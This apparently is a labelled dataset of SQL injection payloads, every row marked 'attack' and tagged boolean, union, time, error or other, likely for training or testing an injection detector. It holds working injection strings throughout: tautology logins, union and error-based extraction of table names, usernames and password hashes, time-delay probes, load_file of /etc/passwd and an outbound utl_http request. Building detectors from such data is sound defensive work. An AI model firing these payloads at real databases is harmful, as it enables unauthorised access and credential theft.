label,payload,family
attack,""" or pg_sleep  (  __TIME__  )  --",time
attack,"create user name identified by pass123 temporary tablespace temp default tablespace users,",other
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",union
attack, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,other
attack,select * from users where id  =  1 +$+ or 1  =  1 -- 1,boolean
attack,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",other
attack," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",union
attack,? or 1  =  1 --,boolean
attack, )   or   (  'a'  =  'a,boolean
attack,admin' or 1  =  1#,boolean
attack," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",boolean
attack,or 1  =  1 --,boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",union
attack,distinct,other
attack,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',boolean
attack,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",boolean
attack,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,boolean
attack,"admin"" or ""1""  =  ""1""--",boolean
attack," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",boolean
attack,insert,other
attack," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",boolean
attack,"or 1  =  1 or """"  =  ",boolean
attack,/**/or/**/1/**/  =  /**/1,boolean
attack," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",union
attack,or 1  =  1/*,boolean
attack,%27 or 1  =  1,boolean
attack," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",union
attack,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",other
attack," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",union
attack,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",union
attack,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",boolean
attack,or 1 --',boolean
attack,"admin"" or 1  =  1#",boolean
attack," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",union
attack,\x27UNION SELECT,other
attack,PRINT,other
attack," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",union
attack,or 1  =  1--,boolean
attack,1 or pg_sleep  (  __TIME__  )  --,time
attack," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",boolean
attack,admin'  )   or   (  '1'  =  '1'/*,boolean
attack,or 2 between 1 and 3,boolean
attack," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",union
attack,admin' or '1'  =  '1,boolean
attack,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",time
attack," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack,""" or 0  =  0 --",boolean
attack," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",union
attack,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",boolean
attack,char%4039%41%2b%40SELECT,other
attack," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",boolean
attack,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,other
attack,"or 0  =  0 #""",boolean
attack," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",union
attack,$  (  sleep 50  ) ,time
attack," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",boolean
attack,"""a"""" or 1  =  1--""",boolean
attack," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",union
attack,1 and user_name  (    )     =   'dbo',boolean
attack,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",time
attack," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",union
attack,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',boolean
attack,select * from users where id  =  1 +$+. or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",error
attack,or 1  =  1 or ''  =  ',boolean
attack,select * from users where id  =  1   or 1  =  1 -- 1,boolean
attack,or 'text' > 't',boolean
attack,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",union
attack," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",boolean
attack,admin' or '1'  =  '1'#,boolean
attack,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",error
attack, select * from information_schema.tables--,other
attack," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",boolean
attack,1   )    )    or pg_sleep  (  __TIME__  )  --,time
attack,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,other
attack,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,other
attack," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",union
attack,or 'unusual'   =   'unusual',boolean
attack, or 1 in   (  select @@version  )  --,boolean
attack,as,other
attack, or 3  =  3 --,boolean
attack," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",union
attack,"admin""  )   or   (  ""1""  =  ""1",boolean
attack," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 union select .1_,version  (    )   -- 1",union
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,error
attack,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,boolean
attack,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",time
attack,1  )   or sleep  (  __TIME__  )  #,time
attack," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",union
attack,", execute immediate 'sel' || 'ect us' || 'er'",other
attack,"hi' or 'x'  =  'x',",boolean
attack,select * from users where id  =  1 <@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",boolean
attack,admin' #,other
attack," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",boolean
attack," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",union
attack,"""  )  ;waitfor delay '0:0:__TIME__'--",time
attack," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",boolean
attack,like,other
attack,"or username like char  (  37  )  ,",boolean
attack, )    )    or pg_sleep  (  __TIME__  )  --,time
attack,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,boolean
attack,or 3  =  3,boolean
attack," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,boolean
attack,exec sp,other
attack," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",union
attack,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,boolean
attack,admin' or 1  =  1/*,boolean
attack,a' waitfor delay '0:0:10'--,time
attack," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",union
attack,and 1 in   (  select var from temp  )  --,boolean
attack,hi'  )   or   (  'a'  =  'a,boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",error
attack,"admin"" or 1  =  1",boolean
attack," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",boolean
attack,"""  )   or sleep  (  __TIME__  )    =  """,time
attack,select * from users where id  =  1.<@. or 1  =  1 -- 1,boolean
attack,"admin""  )   or   (  ""1""  =  ""1""--",boolean
attack," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",union
attack,", exec xp_regread",other
attack," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",union
attack,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",boolean
attack,1 and 1  =  1,boolean
attack,or 0  =  0 #,boolean
attack,union select * from users where login   =   char ...,union
attack," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",union
attack,admin'  )   or '1'  =  '1'--,boolean
attack,"1,SELECT *",other
attack,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",boolean
attack," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,procedure,other
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,error
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",error
attack,"\', desc users, --",other
attack,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',boolean
attack,""" or """"^""",other
attack,"""-""",other
attack," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",union
attack," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",boolean
attack,admin'/*,other
attack," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",boolean
attack,||UTL_HTTP.REQUEST,other
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",union
attack,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",union
attack,admin'  )   or '1'  =  '1'#,boolean
attack,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',other
attack,or '7659'  =  '7659,boolean
attack," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",union
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 union select !<1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",union
attack,""" or true--",boolean
attack,select * from users where id  =  1. or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",boolean
attack,â or 3  =  3 --,boolean
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,error
attack," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",union
